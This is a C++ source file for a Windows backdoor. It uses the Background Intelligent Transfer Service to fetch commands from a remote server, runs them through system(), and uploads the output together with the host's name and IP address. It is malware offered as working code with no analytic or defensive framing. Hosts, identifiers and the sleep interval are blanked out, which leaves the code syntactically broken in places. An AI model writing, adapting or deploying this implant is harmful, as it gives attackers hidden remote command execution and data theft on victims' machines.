
#include <windows.h>
#include <bits.h>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iomanip>
#include <shlwapi.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")

namespace fs = std::filesystem;

#define COMMAND_URL L"http:///commands/.json"
#define UPLOAD_URL L"http:///uploads/_response.txt"
#define NOTIFY_URL L"http:///notify.txt"

std::string get_local_command_file()
{
    return fs::temp_directory_path().string() + ".json";
}

std::string get_local_result_file()
{
    return fs::temp_directory_path().string() + "_response.txt";
}

std::wstring get_local_command_file_wstring()
{
    return std::wstring(fs::temp_directory_path().wstring() + L".json");
}

std::wstring get_local_result_file_wstring()
{
    return std::wstring(fs::temp_directory_path().wstring() + L"_response.txt");
}

std::string extractCommandFromJson(const std::string& json) {
    size_t start = json.find("\"command\"");
    if (start == std::string::npos) {
        return "";
    }
    start = json.find(":", start);
    if (start == std::string::npos) {
        return "";
    }
    start = json.find("\"", start) + 1;
    size_t end = json.find("\"", start);
    if (start == std::string::npos || end == std::string::npos) {
        return "";
    }
    return json.substr(start, end - start);
}

std::string readCommandFromFile(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {
        return "";
    }
    std::string jsonContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    return extractCommandFromJson(jsonContent);
}

std::string getHostname() {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    return std::string(hostname);
}

std::string getIPAddress() {
    std::string ip = "Unknown";
    char buffer[1024];
    FILE* pipe = _popen("ipconfig | findstr IPv4", "r");
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe)) {
            std::string line(buffer);
            size_t pos = line.find("IPv4 Address");
            if (pos != std::string::npos) {
                pos = line.find(":") + 2;
                ip = line.substr(pos);
                ip.erase(ip.find_last_not_of(" 
	") + 1);
                break;
            }
        }
        _pclose(pipe);
    }
    return ip;
}

HRESULT InitializeCOM() {
    return CoInitializeEx(NULL, COINIT_MULTITHREADED);
}

HRESULT CreateBITSManager(IBackgroundCopyManager** pManager) {
    return CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER,
                            __uuidof(IBackgroundCopyManager), (void**)pManager);
}

HRESULT DownloadFile(IBackgroundCopyManager* pManager) {
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;
    HRESULT hr = pManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {
        std::wstring localCommandFile = get_local_command_file_wstring();
        hr = pJob->AddFile(COMMAND_URL, localCommandFile.c_str());
        if (SUCCEEDED(hr)) {
            pJob->Resume();
        } else {
            pJob->Release();
            return hr;
        }
        BG_JOB_STATE state;
        do {
            Sleep(1000);
            pJob->GetState(&state);
        } while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);
        if (state == BG_JOB_STATE_TRANSFERRED) {
            hr = pJob->Complete();
        } else {
            hr = E_FAIL;
        }
        pJob->Release();
    }
    return hr;
}

HRESULT UploadFile(IBackgroundCopyManager* pManager, const std::wstring& uploadUrl, const std::wstring& localFile) {
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;
    HRESULT hr = pManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {
        hr = pJob->AddFile(uploadUrl.c_str(), localFile.c_str());
        if (FAILED(hr)) {
            pJob->Release();
            return hr;
        }
        hr = pJob->Resume();
        if (FAILED(hr)) {
            pJob->Release();
            return hr;
        }
        BG_JOB_STATE state;
        do {
            Sleep(1000);
            pJob->GetState(&state);
        } while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);
        if (state == BG_JOB_STATE_TRANSFERRED) {
            hr = pJob->Complete();
        }
        pJob->Release();
    }
    return hr;
}

void executeCommand(const std::string& command) {
    if (command.empty()) {
        return;
    }
    std::string resultFile = get_local_result_file();
    std::string hostname = getHostname();
    std::string ip = getIPAddress();
    std::string fullCommand = command + " > " + resultFile + " 2>&1";
    int returnCode = system(fullCommand.c_str());
    std::string tempFile = resultFile + ".tmp";
    std::ofstream outFile(tempFile);
    outFile << hostname << "\n" << ip << "\n";
    std::ifstream inFile(resultFile);
    if (inFile.is_open() && outFile.is_open()) {
        outFile << inFile.rdbuf();
        inFile.close();
        outFile.close();
        std::remove(resultFile.c_str());
        std::rename(tempFile.c_str(), resultFile.c_str());
    }
}

int main() {
    std::string identifier = "";
    HRESULT hr = InitializeCOM();
    if (FAILED(hr)) {
        return 1;
    }
    IBackgroundCopyManager* pManager = NULL;
    hr = CreateBITSManager(&pManager);
    if (FAILED(hr)) {
        CoUninitialize();
        return 1;
    }
    std::ofstream notifyFile("_notify.txt");
    if (notifyFile.is_open()) {
        notifyFile << "identifier=";
        notifyFile.close();
        UploadFile(pManager, NOTIFY_URL, L"_notify.txt");
        std::remove("_notify.txt");
    }
    while (true) {
        if (SUCCEEDED(DownloadFile(pManager))) {
            std::string command = readCommandFromFile(get_local_command_file());
            executeCommand(command);
            UploadFile(pManager, UPLOAD_URL, get_local_result_file_wstring());
        }
        if (pManager) {
            pManager->Release();
        }
        CoUninitialize();
        Sleep( * 1000);
        hr = InitializeCOM();
        if (FAILED(hr)) {
            return 1;
        }
        hr = CreateBITSManager(&pManager);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }
    }
    return 0;
}
